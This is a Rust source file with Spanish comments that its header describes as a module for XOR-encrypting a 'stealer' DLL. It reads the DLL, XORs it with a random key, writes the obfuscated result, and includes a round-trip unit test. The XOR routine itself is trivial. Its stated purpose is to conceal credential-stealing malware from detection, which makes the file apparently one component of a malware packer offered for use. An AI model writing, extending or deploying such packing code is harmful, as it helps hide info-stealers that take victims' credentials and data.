// Módulo para encriptar la DLL de stealer con XOR simple
use std::fs;
use std::path::Path;

/// Encripta un archivo con XOR usando una clave
pub fn encrypt_dll(dll_path: &Path, output_path: &Path, key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    println!("📦 Leyendo DLL: {}", dll_path.display());
    let dll_bytes = fs::read(dll_path)?;
    
    println!("🔐 Encriptando {} bytes con XOR (key length: {})", dll_bytes.len(), key.len());
    let encrypted = xor_encrypt(&dll_bytes, key);
    
    println!("💾 Guardando DLL encriptada en: {}", output_path.display());
    fs::write(output_path, encrypted)?;
    
    Ok(())
}

/// Encripta/Desencripta datos con XOR (simétrico)
pub fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Genera una clave XOR aleatoria
pub fn generate_random_key(length: usize) -> Vec<u8> {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    (0..length).map(|_| rng.gen()).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_encrypt_decrypt() {
        let data = b"Hello, World!";
        let key = b"secret_key";
        
        let encrypted = xor_encrypt(data, key);
        assert_ne!(encrypted, data.to_vec());
        
        let decrypted = xor_encrypt(&encrypted, key);
        assert_eq!(decrypted, data.to_vec());
    }
}
